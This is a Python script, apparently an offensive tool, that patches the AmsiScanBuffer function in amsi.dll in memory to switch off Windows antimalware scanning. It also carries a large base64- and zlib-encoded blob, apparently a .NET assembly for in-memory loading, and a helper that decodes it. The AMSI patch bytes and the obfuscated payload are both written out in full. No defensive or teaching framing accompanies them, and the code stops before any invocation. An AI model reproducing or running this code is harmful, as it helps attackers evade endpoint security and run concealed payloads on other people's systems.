import base64
import zlib
import argparse
import clr
import ctypes
from ctypes import *
import System
from System import Array, IntPtr, UInt32
from System.Reflection import Assembly
import System.Reflection as Reflection

# Ensure necessary .NET references are added
clr.AddReference("System.Management.Automation")

from System.Management.Automation import Runspaces, RunspaceInvoke
from System.Runtime.InteropServices import Marshal

base64_str = "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"


def bypass():
    """
    Bypasses the Antimalware Scan Interface (AMSI) by patching the AmsiScanBuffer method in amsi.dll.
    This allows scripts to run without being scanned and potentially blocked by AMSI.
    """
    windll.LoadLibrary("amsi.dll")
    windll.kernel32.GetModuleHandleW.argtypes = [c_wchar_p]
    windll.kernel32.GetModuleHandleW.restype = c_void_p
    handle = windll.kernel32.GetModuleHandleW('amsi.dll')
    windll.kernel32.GetProcAddress.argtypes = [c_void_p, c_char_p]
    windll.kernel32.GetProcAddress.restype = c_void_p
    BufferAddress = windll.kernel32.GetProcAddress(handle, "AmsiScanBuffer")
    BufferAddress = IntPtr(BufferAddress)
    Size = System.UInt32(0x05)
    ProtectFlag = System.UInt32(0x40)
    OldProtectFlag = Marshal.AllocHGlobal(0)
    virt_prot = windll.kernel32.VirtualProtect(BufferAddress, Size, ProtectFlag, OldProtectFlag)
    patch = System.Array[System.Byte]((System.UInt32(0xB8), System.UInt32(0x57), System.UInt32(0x00), System.UInt32(0x07), System.UInt32(0x80), System.UInt32(0xC3)))
    Marshal.Copy(patch, 0, BufferAddress, 6)

def base64_to_bytes(base64_string):
    """
    Converts a base64 encoded string to a .NET byte array after decompressing it.
    Args:
        base64_string: The base64 encoded and compressed string to convert.
    Returns:
        A .NET byte array of the decompressed data.
    """
    # Decode the base64 string to get the compressed binary data
    compressed_data = base64.b64decode(base64_string)
    # Decompress the data
    decompressed_data = zlib.decompress(compressed_data)
    # Convert the decompressed binary data to a .NET byte array
    return System.Array[System.Byte](decompressed_data)

